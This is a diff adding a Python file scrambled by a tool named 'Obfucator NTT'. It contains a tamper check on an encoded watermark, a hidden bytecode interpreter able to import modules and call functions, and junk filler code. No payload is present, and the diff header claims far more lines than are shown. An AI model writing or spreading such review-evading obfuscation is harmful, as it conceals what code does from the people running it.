@@ -1,0 +1,1442 @@
+# Version 8
+# Obfucator NTT - https://discord.gg/YAdrT39SWq
+dowqWJuf_88BdThQY=''.join(map(lambda _x:chr(_x^4),[75, 102, 98, 113, 103, 101, 112, 107, 118, 36, 74, 80, 80, 36, 41, 36, 108, 112, 112, 116, 119, 62, 43, 43, 96, 109, 119, 103, 107, 118, 96, 42, 99, 99, 43, 93, 69, 96, 118, 80, 55, 61, 87, 83, 117]))
+CefCvkGV_hXHSerEU=dowqWJuf_88BdThQY
+if CefCvkGV_hXHSerEU!=''.join(map(lambda _x:chr(_x^4),[75, 102, 98, 113, 103, 101, 112, 107, 118, 36, 74, 80, 80, 36, 41, 36, 108, 112, 112, 116, 119, 62, 43, 43, 96, 109, 119, 103, 107, 118, 96, 42, 99, 99, 43, 93, 69, 96, 118, 80, 55, 61, 87, 83, 117])):__import__("sys").exit()
+import builtins as LwJIwByL_3WUHPoDl
+def vsrrGyqB_nMGL3zxN(THmIXeAT_Uv534Cb4):
+ def SjlokWgG_4usWZO6N(YTHJCtIZ_edGlvEUu,stavPPYc_T6ShDaj3=None,hwyMSyku_YUyQmPRY=(),kwargs=None):ihnGnldO_I7pNZbVo=YTHJCtIZ_edGlvEUu['JOBBqkVE_F1wTWDhK'];EPDUEwyD_k7qD4NZ2=YTHJCtIZ_edGlvEUu['NbmLvVPl_QHrSn5Af'];gYRuyOjD_g2o9SKjx=YTHJCtIZ_edGlvEUu['FcvQsFUf_U4XrAs9K'];tZhChPFy_8fwqbupM=YTHJCtIZ_edGlvEUu['fhuctOnk_99WtMbd3'];ETkVjpdA_UnHb9jLT=YTHJCtIZ_edGlvEUu.get('vFxTVMiL_6e4QqeX7') or []
+  gDNbGvYr_zRolm27Z=[];LmBoLWiQ_hBapOI0j=0;ZbjAoWOB_UQCHcdTn=kwargs or {};tnFkAFab_VsEOWqtr=[None]*len(tZhChPFy_8fwqbupM);KZIGaxdt_LbNZ9Xog=len(tZhChPFy_8fwqbupM)-len(ETkVjpdA_UnHb9jLT)
+  for i,kkASehyO_KLycm4hX in enumerate(ETkVjpdA_UnHb9jLT):tnFkAFab_VsEOWqtr[KZIGaxdt_LbNZ9Xog+i]=kkASehyO_KLycm4hX
+  for i,kkASehyO_KLycm4hX in enumerate(hwyMSyku_YUyQmPRY):
+   if i<len(tZhChPFy_8fwqbupM):tnFkAFab_VsEOWqtr[i]=kkASehyO_KLycm4hX
+  for k,kkASehyO_KLycm4hX in ZbjAoWOB_UQCHcdTn.items():
+   if k in tZhChPFy_8fwqbupM:tnFkAFab_VsEOWqtr[tZhChPFy_8fwqbupM.index(k)]=kkASehyO_KLycm4hX
+  nxZxNGMC_vyojtEzh=dict(stavPPYc_T6ShDaj3 or {})
+  def lsWddmTm_ssLIfQwh(ThyYZhUq_QSSWJChC):
+   def UVFrfWul_PljwOjny(*HtEZrsdK_hTdjTiez,**mmHHuWsA_N2LjwMXT):return SjlokWgG_4usWZO6N(ThyYZhUq_QSSWJChC,nxZxNGMC_vyojtEzh,HtEZrsdK_hTdjTiez,mmHHuWsA_N2LjwMXT)
+   return UVFrfWul_PljwOjny
+  while LmBoLWiQ_hBapOI0j<len(ihnGnldO_I7pNZbVo):bcxuuJnS_7GBQCI5k=ihnGnldO_I7pNZbVo[LmBoLWiQ_hBapOI0j];ZoQXnAmu_YqFrPspr=ihnGnldO_I7pNZbVo[LmBoLWiQ_hBapOI0j+1];LmBoLWiQ_hBapOI0j+=2;UAgQREYW_DEJf9Pyr=THmIXeAT_Uv534Cb4.get(bcxuuJnS_7GBQCI5k)
+   if UAgQREYW_DEJf9Pyr=='LcugDbFL_UtDcQZdJ':kkASehyO_KLycm4hX=EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr]
+    gDNbGvYr_zRolm27Z.append(lsWddmTm_ssLIfQwh(kkASehyO_KLycm4hX) if isinstance(kkASehyO_KLycm4hX,dict) and kkASehyO_KLycm4hX.get('FiVJWYRM_pd7ECLXv') else kkASehyO_KLycm4hX)
+   elif UAgQREYW_DEJf9Pyr=='NKAxxKod_pEkAUvGz':kuZBIdgc_iFC6pTGW=gYRuyOjD_g2o9SKjx[ZoQXnAmu_YqFrPspr];kkASehyO_KLycm4hX=nxZxNGMC_vyojtEzh.get(kuZBIdgc_iFC6pTGW)
+    if kkASehyO_KLycm4hX is None:kkASehyO_KLycm4hX=getattr(LwJIwByL_3WUHPoDl,kuZBIdgc_iFC6pTGW,None)
+    gDNbGvYr_zRolm27Z.append(kkASehyO_KLycm4hX)
+   elif UAgQREYW_DEJf9Pyr=='ZUKbjlrT_hb7W93oY':nxZxNGMC_vyojtEzh[gYRuyOjD_g2o9SKjx[ZoQXnAmu_YqFrPspr]]=gDNbGvYr_zRolm27Z.pop()
+   elif UAgQREYW_DEJf9Pyr=='vyuzSlKa_OpI6WyhD':gDNbGvYr_zRolm27Z.append(tnFkAFab_VsEOWqtr[ZoQXnAmu_YqFrPspr])
+   elif UAgQREYW_DEJf9Pyr=='ltyRzruh_4AHComMz':tnFkAFab_VsEOWqtr[ZoQXnAmu_YqFrPspr]=gDNbGvYr_zRolm27Z.pop()
+   elif UAgQREYW_DEJf9Pyr=='zfYYswVf_G8jAFY6i':qNiORycV_xApBfgOW=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(getattr(qNiORycV_xApBfgOW,EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr]))
+   elif UAgQREYW_DEJf9Pyr=='gSZBETnn_jffOdeK7':qNiORycV_xApBfgOW=gDNbGvYr_zRolm27Z.pop();bgSIgXeW_innwikDG=gDNbGvYr_zRolm27Z.pop();setattr(qNiORycV_xApBfgOW,EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr],bgSIgXeW_innwikDG)
+   elif UAgQREYW_DEJf9Pyr=='lCajRPoS_22aewWlg':gDNbGvYr_zRolm27Z.pop()
+   elif UAgQREYW_DEJf9Pyr=='sSCDxPsZ_QeRdXaZe':gDNbGvYr_zRolm27Z.append(gDNbGvYr_zRolm27Z[-1])
+   elif UAgQREYW_DEJf9Pyr=='ghelBbVc_TUuim6tm':gDNbGvYr_zRolm27Z[-1],gDNbGvYr_zRolm27Z[-2]=gDNbGvYr_zRolm27Z[-2],gDNbGvYr_zRolm27Z[-1]
+   elif UAgQREYW_DEJf9Pyr=='PCTfplCa_uSiYljVI':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4+PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='bvXxolvY_MxNIwtBP':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4-PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='UyMuuVYg_iUGPIa77':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4*PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='uJInvbtz_hMHWfeRN':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4/PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='gKEOjDfR_vK3siMac':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4%PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='EYgoXVOy_JXTLgULd':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4**PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='TVMYkrgJ_Mqk4oLBU':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4//PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='IftexOlz_Llm3lI6Y':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4&PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='UuqZdILX_LYoukSex':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4|PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='ubHPslrO_LprrSOaF':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4^PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='MPhjWAMG_IH5w17tg':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4<<PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='keUIFoKA_0hDZOKX2':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4>>PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr in('rXZbWbvN_i5jlsgFe','RGUAWqNw_fSUyHfwX','ICmKnEsI_quMcqtHX'):PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop()
+    gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4+PrUJFsRJ_88quAMe2 if UAgQREYW_DEJf9Pyr=='rXZbWbvN_i5jlsgFe' else IzLeKhCg_QxJHThS4-PrUJFsRJ_88quAMe2 if UAgQREYW_DEJf9Pyr=='RGUAWqNw_fSUyHfwX' else IzLeKhCg_QxJHThS4*PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='jFHLmQcF_mJmkLStY':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4<PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='ofIPAeNV_hyhO1Jck':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4<=PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='mSuBvXkj_YoclgTjU':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4>PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='iiQsNQwi_Q6jsQdsk':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4>=PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='csYmepAj_EDOGGEMK':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4==PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='PmBoMIDM_6J9WbOpj':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4!=PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='EXKRDbcH_XnNpNqLe':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4 in PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='ZBTcjjtV_0MbeQu88':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4 not in PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='qhbZjvLG_w1zLFxXX':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4 is PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='VrWqdrbu_uyNtkLEw':PrUJFsRJ_88quAMe2=gDNbGvYr_zRolm27Z.pop();IzLeKhCg_QxJHThS4=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(IzLeKhCg_QxJHThS4 is not PrUJFsRJ_88quAMe2)
+   elif UAgQREYW_DEJf9Pyr=='DnDHOzPs_cX0OZWqC':gDNbGvYr_zRolm27Z.append(-gDNbGvYr_zRolm27Z.pop())
+   elif UAgQREYW_DEJf9Pyr=='BNBEALQA_L1ZrXWlX':gDNbGvYr_zRolm27Z.append(not gDNbGvYr_zRolm27Z.pop())
+   elif UAgQREYW_DEJf9Pyr=='nKnBOVRD_kURWBPRn':gDNbGvYr_zRolm27Z.append(~gDNbGvYr_zRolm27Z.pop())
+   elif UAgQREYW_DEJf9Pyr=='OyFhvIYn_xC4jNVqe':LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='TPOEulvn_Kn3xNDoL':kkASehyO_KLycm4hX=gDNbGvYr_zRolm27Z.pop()
+    if kkASehyO_KLycm4hX:LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='AfxoZLhj_gLqalBZj':kkASehyO_KLycm4hX=gDNbGvYr_zRolm27Z.pop()
+    if not kkASehyO_KLycm4hX:LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='VzQoDRvU_6CMJYgFw':
+    if gDNbGvYr_zRolm27Z[-1]:LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='CTrqWZCB_IB3vbs67':
+    if not gDNbGvYr_zRolm27Z[-1]:LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='ymjURlVy_Rur3nT5o':dvaqbyay_2dqYbZBJ=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];ZNfOxqYV_bwc2fYPO=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(ZNfOxqYV_bwc2fYPO(*dvaqbyay_2dqYbZBJ))
+   elif UAgQREYW_DEJf9Pyr=='NWkTyrbf_atoirb7b':mmHHuWsA_N2LjwMXT=gDNbGvYr_zRolm27Z.pop();dvaqbyay_2dqYbZBJ=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];ZNfOxqYV_bwc2fYPO=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(ZNfOxqYV_bwc2fYPO(*dvaqbyay_2dqYbZBJ,**mmHHuWsA_N2LjwMXT))
+   elif UAgQREYW_DEJf9Pyr=='VJJguoia_0ZmutxCz':mmHHuWsA_N2LjwMXT=gDNbGvYr_zRolm27Z.pop();dvaqbyay_2dqYbZBJ=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];xqsDUAOw_yvClX7es=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(xqsDUAOw_yvClX7es(*dvaqbyay_2dqYbZBJ,**mmHHuWsA_N2LjwMXT))
+   elif UAgQREYW_DEJf9Pyr=='prqnkWla_9qhlj9aV':qNiORycV_xApBfgOW=gDNbGvYr_zRolm27Z.pop();xqsDUAOw_yvClX7es=getattr(qNiORycV_xApBfgOW,EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr]);gDNbGvYr_zRolm27Z.append(qNiORycV_xApBfgOW);gDNbGvYr_zRolm27Z.append(xqsDUAOw_yvClX7es)
+   elif UAgQREYW_DEJf9Pyr=='nbMLzKCx_cqwklfri':dvaqbyay_2dqYbZBJ=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];xqsDUAOw_yvClX7es=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.pop()
+    gDNbGvYr_zRolm27Z.append(xqsDUAOw_yvClX7es(*dvaqbyay_2dqYbZBJ))
+   elif UAgQREYW_DEJf9Pyr=='TEUwVRis_A5kjh1E5':return gDNbGvYr_zRolm27Z.pop() if gDNbGvYr_zRolm27Z else None
+   elif UAgQREYW_DEJf9Pyr=='vSPvzXti_pYwBcbVy':return None
+   elif UAgQREYW_DEJf9Pyr=='TvPQKuHG_Xj3aUxJr':RCTJAWZu_4qCrbLE3=gDNbGvYr_zRolm27Z.pop()
+    gDNbGvYr_zRolm27Z.append(lsWddmTm_ssLIfQwh(RCTJAWZu_4qCrbLE3) if isinstance(RCTJAWZu_4qCrbLE3,dict) and RCTJAWZu_4qCrbLE3.get('FiVJWYRM_pd7ECLXv') else RCTJAWZu_4qCrbLE3)
+   elif UAgQREYW_DEJf9Pyr=='kSIorghH_voxWSEsZ':tcHaEUhC_5aaGPH9q=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];gDNbGvYr_zRolm27Z.append(list(tcHaEUhC_5aaGPH9q))
+   elif UAgQREYW_DEJf9Pyr=='TGgrFmNX_vGQyith8':tcHaEUhC_5aaGPH9q=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];gDNbGvYr_zRolm27Z.append(tuple(tcHaEUhC_5aaGPH9q))
+   elif UAgQREYW_DEJf9Pyr=='KSUmNErL_FhboU5n9':bDyHkKfg_rc7VJcJI=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr*2)][::-1]
+    gDNbGvYr_zRolm27Z.append({bDyHkKfg_rc7VJcJI[i]:bDyHkKfg_rc7VJcJI[i+1] for i in range(0,len(bDyHkKfg_rc7VJcJI),2)})
+   elif UAgQREYW_DEJf9Pyr=='noaHNWbK_rR3ckiLs':tcHaEUhC_5aaGPH9q=[gDNbGvYr_zRolm27Z.pop() for _ in range(ZoQXnAmu_YqFrPspr)][::-1];gDNbGvYr_zRolm27Z.append(set(tcHaEUhC_5aaGPH9q))
+   elif UAgQREYW_DEJf9Pyr=='xTCXoHaR_3VMt3eeW':MIGSwFTr_r7P108eW=gDNbGvYr_zRolm27Z.pop();qNiORycV_xApBfgOW=gDNbGvYr_zRolm27Z.pop();gDNbGvYr_zRolm27Z.append(qNiORycV_xApBfgOW[MIGSwFTr_r7P108eW])
+   elif UAgQREYW_DEJf9Pyr=='ROXIQNmc_optYv415':MIGSwFTr_r7P108eW=gDNbGvYr_zRolm27Z.pop();qNiORycV_xApBfgOW=gDNbGvYr_zRolm27Z.pop();bgSIgXeW_innwikDG=gDNbGvYr_zRolm27Z.pop();qNiORycV_xApBfgOW[MIGSwFTr_r7P108eW]=bgSIgXeW_innwikDG
+   elif UAgQREYW_DEJf9Pyr=='zyJLUDOW_4fWzVYjh':gDNbGvYr_zRolm27Z.append(iter(gDNbGvYr_zRolm27Z.pop()))
+   elif UAgQREYW_DEJf9Pyr=='CEcDGSZI_V1MiAqAq':mrhUvvfR_4y4m3XE6=gDNbGvYr_zRolm27Z[-1]
+    try:gDNbGvYr_zRolm27Z.append(next(mrhUvvfR_4y4m3XE6))
+    except StopIteration:gDNbGvYr_zRolm27Z.pop();LmBoLWiQ_hBapOI0j=ZoQXnAmu_YqFrPspr*2
+   elif UAgQREYW_DEJf9Pyr=='xXSZmwDU_CNCiwZ48':import importlib as HwmCAAUe_CKRmsUmZ
+    uJEfFlRs_8DsDtvSQ=EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr];fEalOBfT_NmT0U0Ym=HwmCAAUe_CKRmsUmZ.import_module(uJEfFlRs_8DsDtvSQ);gDNbGvYr_zRolm27Z.append(fEalOBfT_NmT0U0Ym)
+   elif UAgQREYW_DEJf9Pyr=='oBhmWmqU_OnagcfIH':import importlib as HwmCAAUe_CKRmsUmZ
+    mod=gDNbGvYr_zRolm27Z[-1];uDvqqMAr_jFJGMNPO=EPDUEwyD_k7qD4NZ2[ZoQXnAmu_YqFrPspr]
+    try:MjEIydSD_93w9pAhT=HwmCAAUe_CKRmsUmZ.import_module(mod.__name__+'.'+uDvqqMAr_jFJGMNPO);gDNbGvYr_zRolm27Z.append(MjEIydSD_93w9pAhT)
+    except (ImportError,AttributeError):gDNbGvYr_zRolm27Z.append(getattr(mod,uDvqqMAr_jFJGMNPO))
+   elif UAgQREYW_DEJf9Pyr=='ItDaIJeS_WL05qONt':aGOWVvjR_W3EJKwW1=list(gDNbGvYr_zRolm27Z.pop())
+    for kkASehyO_KLycm4hX in reversed(aGOWVvjR_W3EJKwW1[:ZoQXnAmu_YqFrPspr]):gDNbGvYr_zRolm27Z.append(kkASehyO_KLycm4hX)
+   elif UAgQREYW_DEJf9Pyr=='NlLhvRtC_5PGNcozb':aYaiuTmK_xDTUmdci=gDNbGvYr_zRolm27Z.pop()
+    if aYaiuTmK_xDTUmdci is not None:raise aYaiuTmK_xDTUmdci
+   elif UAgQREYW_DEJf9Pyr in('AqZpgnRR_G7ek0J41','VaxZsTic_hmf16anv','KSgVyyZN_71xn3a7h','pAezFVUt_6kvAfrvD','qDRNbMWi_ODvCRR3N'):pass
+  return None
+ return SjlokWgG_4usWZO6N
+def EMhxuTyw_nVlYBpBc(rtlfCmRX_lErc1HiV,ncEqOtgz_kMJXJ69H):
+ def EBnxlCob_45CZoUAL(iWbBGAAB_H1KndZyy):jYPVGszl_RnUALf9j=iWbBGAAB_H1KndZyy['rbc'];hYpHmwHK_3mOxukxq=list(iWbBGAAB_H1KndZyy['rco'])
+  CaevFxAA_dF7xucAN=[None]*16;BJrotgBK_18eRklcv=0;hYpHmwHK_3mOxukxq[iWbBGAAB_H1KndZyy['rfn_idx']]=ncEqOtgz_kMJXJ69H
+  while BJrotgBK_18eRklcv<len(jYPVGszl_RnUALf9j):QVItDyGq_1Sb3a2cx=jYPVGszl_RnUALf9j[BJrotgBK_18eRklcv];pqnsLtwq_ie6cbs38=jYPVGszl_RnUALf9j[BJrotgBK_18eRklcv+1];LUteexGA_r0yhl0Dq=jYPVGszl_RnUALf9j[BJrotgBK_18eRklcv+2];LdcacdiW_SU85KNdI=jYPVGszl_RnUALf9j[BJrotgBK_18eRklcv+3];BJrotgBK_18eRklcv+=4
+   jIEkPmoo_7JRzbiOo=rtlfCmRX_lErc1HiV.get(QVItDyGq_1Sb3a2cx)
+   if jIEkPmoo_7JRzbiOo=='BJbVQDJF_QzDmVxqp':pass
+   elif jIEkPmoo_7JRzbiOo=='NJWWwfju_Qi6yGC9C':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=hYpHmwHK_3mOxukxq[LUteexGA_r0yhl0Dq]
+   elif jIEkPmoo_7JRzbiOo=='thxiTsHA_mka6O4uG':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]
+   elif jIEkPmoo_7JRzbiOo=='ZjffykVw_eN7MnF0w':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]
+   elif jIEkPmoo_7JRzbiOo=='QyhrucwN_500QjZwM':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]+CaevFxAA_dF7xucAN[LdcacdiW_SU85KNdI]
+   elif jIEkPmoo_7JRzbiOo=='PUTcHLCa_blOTuFYk':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]-CaevFxAA_dF7xucAN[LdcacdiW_SU85KNdI]
+   elif jIEkPmoo_7JRzbiOo=='pxwznUIu_XCylUWeD':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]*CaevFxAA_dF7xucAN[LdcacdiW_SU85KNdI]
+   elif jIEkPmoo_7JRzbiOo=='qoHKMEeE_1ptxM1bc':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]^CaevFxAA_dF7xucAN[LdcacdiW_SU85KNdI]
+   elif jIEkPmoo_7JRzbiOo=='cRRfoFeW_DxGcB5Bt':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]==CaevFxAA_dF7xucAN[LdcacdiW_SU85KNdI]
+   elif jIEkPmoo_7JRzbiOo=='AGJRzbdv_JOexPb24':BJrotgBK_18eRklcv=pqnsLtwq_ie6cbs38*4
+   elif jIEkPmoo_7JRzbiOo=='LDVALfAD_fK4ULePE':
+    if not CaevFxAA_dF7xucAN[LUteexGA_r0yhl0Dq]:BJrotgBK_18eRklcv=pqnsLtwq_ie6cbs38*4
+   elif jIEkPmoo_7JRzbiOo=='YgxFbWwo_012L2lCB':CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]=hYpHmwHK_3mOxukxq[iWbBGAAB_H1KndZyy['rfn_idx']](hYpHmwHK_3mOxukxq[0],hYpHmwHK_3mOxukxq[1])
+   elif jIEkPmoo_7JRzbiOo=='hYMZnCVO_2ggTZHKH':return CaevFxAA_dF7xucAN[pqnsLtwq_ie6cbs38]
+   elif jIEkPmoo_7JRzbiOo in('OoYnWsXS_1J3kYheh','rVMxmKaj_KzFGcRmO'):pass
+  return None
+ return EBnxlCob_45CZoUAL
+GXorJeoY_85InNUMK=(lambda _:_*31+37)
+wWhHHRgl_It0t8krg=[56410,31426,45243,13224,32877,34872,44373,45409]
+def DLeOhdUm_xFyW8EhE():
+ LrLAGhDU_RjaGGpvQ=59944^39371
+ return 34824
+tOQdcyly_Nbajy1PS=[1699,8812,8842,59938]
+class cSsEIyQE_bgSZDQ9D:
+ def GFpFNjqG_nht2pUtP(self):
+  return 38202
+ypofmhTp_dEoDcNp8=2456118556+3840228812
+sVqBPBqz_GcwVKh1r=(63012*63012&81)^63012
+while False:pass
+deToynlJ_x7lOEjEn=[24138,47623,16070,11707,55721]
+class ftawlVbn_rJ3wNFGE:
+ def PTYYWUtv_6SAL3wen(self):
+  return 45110
+while False:pass
+class ssXdLQpF_2xBFcdlN:
+ def LqoiHDOy_tQ5Tv4CN(self):
+  return 11099
+if (7900^7900)==0:WXGMmtae_u0ulVmI8=30509^63417
+qkWTomnO_VCSnPAwA=(5622*5622&120)^5622
+pxwZmojo_LYXPpJIl={17:46055,238:46070}
+class obQOeZBA_1hEHBZ9G:
+ def cPvwMeCX_GLSWvPwc(self):
+  return 19652
+UgZwRLGV_VjFuJn7X=[44721,52167,51377,57110,10865,46268]
+exqmjQtd_wb3YXOQG=1297411436+1751455346
+for vFOYrnjM_pzTuh7PC in []:pass
+for NAbgqYLt_dzl5j1zA in []:pass
+while False:pass
+PIoiptAF_elpnHPhO=[56605,58685,7814,14124,26520,56052,50460]
+BDuagbsR_P08WmY7g=[15115,27206,59982,15138,4277,61033]
+UAJCLsfS_Vy0tSmWA=1193024762*3922641610
+RcxboLDf_l2ZlFoPr=(lambda _:_*60+62)
+def UpXUDgjF_L4AethCh():
+ HDtoQCGQ_50N2xnqi=62068^59387
+ return 57968
+if (26120^26120)==0:fcqFYcRK_WLF9TMYE=49300^22162
+nEfQvlrY_aje64SJQ=404992149&1426130638
+LYHRWZRR_YF4hSDeG=[13618,62855,56676,55413,62491,37097,57736]
